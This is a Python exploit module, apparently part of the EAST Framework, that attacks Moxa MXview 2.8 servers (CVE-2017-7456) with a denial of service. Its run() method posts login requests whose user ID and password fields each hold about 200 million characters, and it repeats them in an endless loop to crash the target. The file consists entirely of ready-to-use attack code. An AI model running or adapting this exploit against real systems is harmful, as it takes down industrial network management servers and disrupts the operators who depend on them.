#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import time
import urllib
import urllib2

sys.path.append('./core')
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efs_moxa_mxview_dos"
INFO['DESCRIPTION'] = "Moxa MXview 2.8 - Denial of Service"
INFO['VENDOR'] = "http://www.moxa.com"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['http://hyp3rlinx.altervista.org/advisories/MOXA-MXVIEW-v2.8-DENIAL-OF-SERVICE.txt']
INFO["CVE Name"] = "CVE-2017-7456"
INFO["NOTES"] = """Remote attackers can DOS MXView server by sending large string of junk characters for the user ID and password field login credentials.
"""
INFO['CHANGELOG'] = "11 Apr, 2017. Written by Gleg team."
INFO['PATH'] = 'Exploits/General/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "127.0.0.1", dict(description = 'Target IP')
OPTIONS["PORT"] = 80, dict(description = 'Target port')


class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        
    def make_url(self, path = ''):
        return 'http://{}:{}{}'.format(self.host, self.port, path)
        
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
        
        url = self.make_url('/goform/account')
        data = urllib.urlencode({'uid' :  'A' * 200000001, 'pwd' : 'A' * 200000001, 'action' : 'login'})
        
        while True:
            request = urllib2.Request(url, data)
            self.log('...DoS ...')
            fd = urllib2.urlopen(request)
            
        self.finish(True)

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
